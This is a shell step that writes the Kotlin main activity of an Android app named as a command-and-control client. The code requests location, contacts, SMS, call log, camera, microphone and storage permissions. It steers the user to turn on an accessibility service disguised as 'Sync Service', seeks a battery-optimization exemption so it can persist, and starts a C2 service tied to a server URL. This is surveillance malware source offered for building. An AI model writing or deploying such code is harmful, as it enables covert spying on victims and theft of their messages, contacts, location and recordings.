
cat > app/src/main/java/com/c2/client/MainActivity.kt << 'EOF'
package com.c2.client

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    private val PERMS = arrayOf(
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.POST_NOTIFICATIONS,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE
    )

    private lateinit var etUrl: EditText

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        etUrl = findViewById(R.id.et_url)
        etUrl.setText(Config.getUrl(this))
        findViewById<TextView>(R.id.status).text = "uuid: ${Config.deviceUuid(this)}"

        findViewById<Button>(R.id.btn_save).setOnClickListener {
            val url = etUrl.text.toString().trim()
            if (url.isBlank() || !url.startsWith("http")) {
                Toast.makeText(this, "URL tidak valid", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            Config.setUrl(this, url)
            startSvc()
            Toast.makeText(this, "Saved + started", Toast.LENGTH_SHORT).show()
        }

        findViewById<Button>(R.id.btn_access).setOnClickListener {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
            Toast.makeText(this, "Nyalakan Sync Service di Accessibility", Toast.LENGTH_LONG).show()
        }

        findViewById<Button>(R.id.btn_perms).setOnClickListener {
            requestPerms()
        }

        requestBatteryOpt()
    }

    private fun requestPerms() {
        val missing = PERMS.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (missing.isEmpty()) {
            startSvc()
            Toast.makeText(this, "Semua izin sudah granted", Toast.LENGTH_SHORT).show()
        } else {
            ActivityCompat.requestPermissions(this, missing.toTypedArray(), 100)
        }
    }

    override fun onRequestPermissionsResult(rc: Int, p: Array<out String>, r: IntArray) {
        super.onRequestPermissionsResult(rc, p, r)
        if (rc == 100) {
            val still = PERMS.filter {
                ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
            }
            if (still.isEmpty()) startSvc()
            else Toast.makeText(this, "Sisa ${still.size} izin — aktifkan accessibility dulu", Toast.LENGTH_LONG).show()
        }
    }

    private fun startSvc() {
        try {
            val svc = Intent(this, C2Service::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svc)
            else startService(svc)
        } catch (_: Exception) {}
    }

    private fun requestBatteryOpt() {
        try {
            val pm = getSystemService(POWER_SERVICE) as android.os.PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                    Uri.parse("package:$packageName")))
            }
        } catch (_: Exception) {}
    }
}
EOF

echo "═══ Emitter, Config, MainActivity done ═══"
